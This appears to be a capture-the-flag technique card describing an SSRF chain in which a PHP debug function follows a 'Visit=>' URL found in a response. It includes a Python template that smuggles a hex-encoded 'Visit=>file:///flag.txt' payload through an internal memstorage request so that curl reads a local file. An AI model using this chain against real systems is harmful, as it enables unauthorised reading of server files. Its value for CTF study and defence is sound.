---
name: visit_redirect_ssrf_chain
vuln_type: ssrf
sub_technique: redirect_chain
category: exploitation
safety_level: safe
tags:
- ssrf
- redirect
- visit
- file-read
- chain
---

# Visit=> Response-Driven Ssrf Chain — Secondary Request Via Response Body Pattern

## When to Apply

A debug_Get/api_Get-style function searches the first HTTP response body for the 'Visit=>URL' pattern, extracts the URL, and sends a second request (api_Get). Injecting Visit=>file:///flag.txt into the first response achieves LFI.

## Prerequisites

- PHP debug_Get: strpos('Visit=>') on response → explode → api_Get(next_url)
- api_Get uses curl, supporting file:// scheme
- Injection point available to insert Visit=>payload into first response body

## Steps

1. Analyze debug_Get function:
   ```php
   function debug_Get($url) {
       $response = file_get_contents($url);
       if(strpos($response, 'Visit=>') !== FALSE) {
           $next_url = explode('Visit=>', $response)[1];
           return api_Get($next_url);
       }
       return $response;
   }
   ```
2. api_Get is curl-based — confirm file:// scheme support
3. Insert `Visit=>file:///flag.txt` string into the first request's response
   (e.g. hex-decoded payload included in memstorage AUTH_S error message)
4. debug_Get extracts `file:///flag.txt` → api_Get(file:///flag.txt) → returns flag

## Code Template

```
# Craft a URL that will make the server return Visit=>file:///flag.txt
visit_payload = 'Visit=>file:///flag.txt'
# Inject via memstorage AUTH_S hex encoding:
visit_hex = visit_payload.encode().hex()
# AUTH_S will echo hex-decoded content in error response
debug_url = f'http://api:9090/get/test|AUTH_S 0d0a0d0a {visit_hex}|BYE'
# Call debug action:
requests.get(f'{base}/memstorage.php', params={'action':'debug','url':debug_url})
```

## Examples

### Example 1

- **trigger_pattern**: Visit=>
- **second_request_func**: api_Get (curl)
- **injected_url**: file:///flag.txt

AUTH_S hex-decoded error response contains Visit=>file:///flag.txt, causing debug_Get to read file:///flag.txt via curl and return the flag.

### Example 2

- **trigger_pattern**: Visit=>
- **second_request_func**: api_Get (curl)
- **injected_url**: file:///flag.txt

Visit=> response can be verified from memstorage via fsockopen, but PHP 8.2+ file_get_contents HTTP parser may reject raw TCP responses.
